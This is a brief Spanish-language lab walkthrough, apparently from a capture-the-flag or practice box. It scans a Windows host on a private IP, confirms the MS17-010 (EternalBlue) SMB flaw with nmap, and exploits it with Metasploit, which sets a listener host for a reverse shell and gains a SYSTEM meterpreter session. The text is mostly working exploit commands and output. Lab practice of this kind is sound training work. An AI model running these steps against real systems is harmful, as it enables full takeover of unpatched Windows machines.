PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds

-Hacemos un escaneo más detallado y encontramos una versión muy antigua de windows corriendo en SMB , comprobamos si es vulnerable a Eternalblue:
	-nmap -p 445 --script=smb-vuln-ms17-010 192.168.236.129
		VULNERABLE

-Explotamos el Eternalblue con Metasploit:
	-Módulo a usar --> exploit/windows/smb/ms17_010_eternalblue
	-Configuración:
		-set rhosts 192.168.236.129
		-set lhost 192.168.236.128
		-run
			meterpreter >whoami
				NT\Authority system (Somos root directamente!!)

